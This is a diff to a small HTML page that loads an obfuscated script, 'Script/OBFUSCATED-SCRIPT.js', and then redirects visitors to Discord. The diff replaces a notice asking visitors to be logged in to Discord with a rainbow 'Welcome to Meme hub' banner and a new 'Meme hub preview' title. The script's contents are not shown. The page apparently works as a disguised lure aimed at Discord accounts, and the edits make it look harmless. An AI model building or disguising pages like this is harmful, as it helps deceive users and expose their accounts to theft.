@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Loading.</title>
+    <title>Meme hub preview</title>
 <script>
     setTimeout(function() {
         window.location.href = 'https://www.discord.com/app';
@@ -28,9 +28,64 @@
       }
 
     </style>
+    <style>
+        .rainbow-text {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  font-size: 48px;
+  text-align: center;
+  width: 100%;
+}
+
+.rainbow-text .typing-text {
+  animation: typing 2s steps(20), color 6s linear infinite;
+  white-space: nowrap;
+  overflow: hidden;
+  border-right: 0.15em solid;
+}
+
+.rainbow-text .cursor {
+  display: inline-block;
+  animation: blink 1s step-end infinite;
+  height: 1em;
+  width: 2px;
+  background-color: black;
+}
+
+@keyframes typing {
+  from { width: 0; }
+  to { width: 100%; }
+}
+
+@keyframes color {
+  0% { color: red; }
+  8% { color: orange; }
+  16% { color: yellow; }
+  25% { color: green; }
+  33% { color: blue; }
+  42% { color: indigo; }
+  50% { color: violet; }
+  58% { color: purple; }
+  67% { color: pink; }
+  75% { color: red; }
+  83% { color: orange; }
+  92% { color: yellow; }
+  100% { color: red; }
+}
+
+@keyframes blink {
+  from, to { border-color: transparent; }
+  50% { border-color: black; }
+}
+    </style>
 </head>
 <body>
 <script src="Script/OBFUSCATED-SCRIPT.js"></script>
- <p class="my-paragraph">You should be redirected to discord, please be sure that you are logged in if you are on PC or any device at this point</p>
+ <div class="rainbow-text">
+  <div class="cursor"></div>
+  <div class="typing-text">Welcome to Meme hub</div>
+</div>
 </body>
 </html>
